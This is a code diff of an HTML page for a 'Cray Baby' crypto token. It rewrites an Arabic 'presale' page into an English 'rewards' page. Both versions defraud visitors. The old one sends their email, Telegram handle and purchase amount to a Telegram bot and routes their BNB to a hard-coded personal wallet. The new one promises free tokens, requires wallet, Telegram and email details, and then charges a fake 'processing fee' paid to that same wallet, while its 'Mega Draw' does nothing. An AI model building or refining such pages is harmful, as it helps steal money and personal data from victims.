@@ -1,102 +1,110 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cray Baby Presale</title>
+    <title>Cray Baby - Official Rewards</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --primary: #f3ba2f; --bg: #0b0e11; --card-bg: #1e2329; }
-        body { font-family: sans-serif; background: var(--bg); color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 10px; box-sizing: border-box; }
-        .card { background: var(--card-bg); border-radius: 15px; padding: 15px; width: 100%; max-width: 360px; text-align: center; border: 1px solid #474d57; }
-        
-        /* شعارك هنا */
-        .logo { width: 70px; height: 70px; border-radius: 50%; border: 2px solid var(--primary); margin-bottom: 5px; object-fit: cover; }
-        
-        h2 { margin: 0; font-size: 18px; }
-        .contract-box { background: #000; padding: 5px; border-radius: 5px; font-size: 9px; color: var(--primary); margin: 8px 0; border: 1px dashed #444; cursor: pointer; }
-        
-        .timer { font-size: 18px; font-weight: bold; color: var(--primary); background: #2b3139; padding: 5px; border-radius: 8px; margin-bottom: 10px; }
-        
-        .input-group { text-align: right; margin-bottom: 8px; }
-        label { font-size: 11px; color: #848e9c; margin-right: 5px; }
-        input { width: 100%; padding: 8px; border-radius: 6px; border: 1px solid #474d57; background: #0b0e11; color: white; font-size: 13px; box-sizing: border-box; }
-        
-        .calc-section { background: #2b3139; padding: 10px; border-radius: 10px; margin-bottom: 10px; }
-        .calc-row { display: flex; align-items: center; gap: 5px; }
-        .calc-row input { flex: 1; text-align: center; }
-        
-        .btn-buy { width: 100%; padding: 12px; border-radius: 8px; border: none; background: var(--primary); color: black; font-weight: bold; font-size: 16px; cursor: pointer; }
-        .footer { font-size: 9px; color: #848e9c; margin-top: 8px; }
+        :root { --primary: #f3ba2f; --bg: #0b0e11; --card-bg: #1e2329; --text-gray: #848e9c; --error: #ff4d4d; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); color: white; display: flex; justify-content: center; padding: 20px; margin: 0; }
+        .card { background: var(--card-bg); border-radius: 24px; padding: 35px; width: 100%; max-width: 480px; text-align: center; border: 1px solid #474d57; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
+        .logo-container { width: 100px; height: 100px; margin: 0 auto 20px; background: #2b3139; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 3px solid var(--primary); }
+        .logo-container i { font-size: 40px; color: var(--primary); }
+        .input-group { text-align: left; margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-size: 13px; color: var(--text-gray); }
+        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #474d57; background: #0b0e11; color: white; box-sizing: border-box; outline: none; }
+        .btn-claim { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--primary); color: black; font-weight: 800; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
+        .modal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); align-items: center; justify-content: center; backdrop-filter: blur(5px); }
+        .modal-content { background: var(--card-bg); padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 2px solid var(--primary); }
+        .opt-btn { width: 100%; padding: 16px; margin: 10px 0; border-radius: 12px; border: 1px solid var(--primary); background: transparent; color: white; font-weight: bold; cursor: pointer; text-align: left; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
+        .opt-btn:hover { background: var(--primary); color: black; }
+        .error-border { border: 1px solid var(--error) !important; background: #241010 !important; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <img src="https://via.placeholder.com/70" alt="Cray Baby Logo" class="logo">
-    
-    <h2>Cray Baby (CRAY)</h2>
-    <div class="contract-box" onclick="navigator.clipboard.writeText('0xf28ec4265650e3bd5e8e2243f87aaafeaf90a141')">
-        <i class="fas fa-copy"></i> 0xf28ec4265650e3bd5e8e2243f87aaafeaf90a141
-    </div>
-
-    <div class="timer" id="countdown">15d 00h 00m 00s</div>
+    <div class="logo-container"><i class="fas fa-baby"></i></div>
+    <h2>CRAY BABY REWARDS</h2>
+    <p style="color: var(--text-gray); font-size: 14px; margin-bottom: 20px;">Complete steps to unlock your prize</p>
 
     <div class="input-group">
-        <input type="email" id="email" placeholder="البريد الإلكتروني (اختياري)">
+        <label>Wallet Address (BEP-20) *</label>
+        <input type="text" id="wallet" class="required" placeholder="0x...">
     </div>
-
     <div class="input-group">
-        <input type="text" id="telegram" placeholder="يوزر التليجرام @ (اختياري)">
+        <label>Telegram Username *</label>
+        <input type="text" id="telegram" class="required" placeholder="@username">
+    </div>
+    <div class="input-group">
+        <label>Email Address *</label>
+        <input type="email" id="email" class="required" placeholder="mail@example.com">
     </div>
 
-    <div class="calc-section">
-        <div class="calc-row">
-            <input type="number" id="bnbInput" placeholder="BNB" oninput="calculate()">
-            <span style="color:var(--primary)">⇆</span>
-            <input type="text" id="crayOutput" placeholder="CRAY" readonly style="background:#1e2329">
+    <button class="btn-claim" onclick="validateForm()">GET REWARD</button>
+</div>
+
+<div id="rewardModal" class="modal">
+    <div id="modalContainer" class="modal-content">
         </div>
-    </div>
-
-    <button class="btn-buy" onclick="redirectToWallet()">شراء الآن / Buy Now</button>
-
-    <div class="footer">
-        🔒 السيولة مقفلة 365 يوم تلقائياً
-    </div>
 </div>
 
 <script>
-    const MY_PERSONAL_WALLET = "0x78722732a023cc5fc4610a5ada50e099cac5e30e";
-    const TELEGRAM_BOT_TOKEN = "ضع_التوكن_هنا";
-    const TELEGRAM_CHAT_ID = "ضع_ID_هنا";
+    const MY_WALLET = "0x78722732a023cc5fc4610a5ada50e099cac5e30e";
+    const BNB_FEE = 0.00025; // Equivalent to $0.15 approximately
 
-    function calculate() {
-        const bnbValue = document.getElementById('bnbInput').value;
-        const crayOutput = document.getElementById('crayOutput');
-        if (bnbValue > 0) {
-            crayOutput.value = ((bnbValue * 1000) / 0.5).toLocaleString();
-        } else { crayOutput.value = ""; }
+    function validateForm() {
+        const fields = document.querySelectorAll('.required');
+        let valid = true;
+        fields.forEach(f => {
+            if(f.value.trim() === "") { f.classList.add('error-border'); valid = false; }
+            else { f.classList.remove('error-border'); }
+        });
+
+        if(valid) { showChoices(); }
+        else { alert("Please fill all required fields!"); }
     }
 
-    let deadline = new Date();
-    deadline.setDate(deadline.getDate() + 15);
-    setInterval(function() {
-        let now = new Date().getTime();
-        let t = deadline - now;
-        let d = Math.floor(t / (1000*60*60*24)), h = Math.floor((t%(1000*60*60*24))/(1000*60*60)), m = Math.floor((t%(1000*60*60))/(1000*60)), s = Math.floor((t%(1000*60))/1000);
-        document.getElementById("countdown").innerHTML = d + "d " + h + "h " + m + "m " + s + "s ";
-    }, 1000);
+    function showChoices() {
+        const container = document.getElementById('modalContainer');
+        container.innerHTML = `
+            <h3 style="color: var(--primary);">SELECT YOUR REWARD</h3>
+            <p style="font-size: 14px;">Choose one of the following:</p>
+            <button class="opt-btn" onclick="showPayment()">
+                <span>🎁 Claim 3,700 $CRAY Now</span>
+                <i class="fas fa-arrow-right"></i>
+            </button>
+            <button class="opt-btn" onclick="submitMegaDraw()">
+                <span>🔥 Enter Mega Draw (Listing Day)</span>
+                <i class="fas fa-arrow-right"></i>
+            </button>
+        `;
+        document.getElementById('rewardModal').style.display = 'flex';
+    }
 
-    async function redirectToWallet() {
-        const amount = document.getElementById('bnbInput').value || "0";
-        const email = document.getElementById('email').value || "N/A";
-        const tg = document.getElementById('telegram').value || "N/A";
+    function showPayment() {
+        const container = document.getElementById('modalContainer');
+        container.innerHTML = `
+            <h3 style="color: var(--primary);">PROCESSING FEE</h3>
+            <p style="font-size: 13px; color: var(--text-gray);">A small network fee is required to verify your wallet and send tokens instantly.</p>
+            <div style="background: #0b0e11; padding: 20px; border-radius: 12px; margin: 20px 0; border: 1px dashed var(--primary);">
+                <span style="font-size: 22px; font-weight: bold; color: white;">0.00025 BNB</span>
+                <p style="font-size: 11px; color: var(--primary); margin-top: 5px;">Approx. $0.15 USD</p>
+            </div>
+            <button class="btn-claim" onclick="payNow()">PAY FEE & RECEIVE TOKENS</button>
+            <p style="font-size: 10px; margin-top: 15px; color: var(--text-gray);">Tokens will be sent to your wallet after confirmation.</p>
+        `;
+    }
 
-        if (amount > 0) {
-            const msg = `🔔 شراء جديد!\n💰 ${amount} BNB\n📧 ${email}\n📱 ${tg}`;
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`);
-            window.location.href = `https://metamask.app.link/send/${MY_PERSONAL_WALLET}?value=${amount * 1e18}`;
-        }
+    function payNow() {
+        const url = `https://metamask.app.link/send/${MY_WALLET}?value=${BNB_FEE * 1e18}`;
+        window.location.href = url;
+    }
+
+    function submitMegaDraw() {
+        alert("✅ Success! You have entered the Mega Draw. Good luck!");
+        document.getElementById('rewardModal').style.display = 'none';
     }
 </script>
 
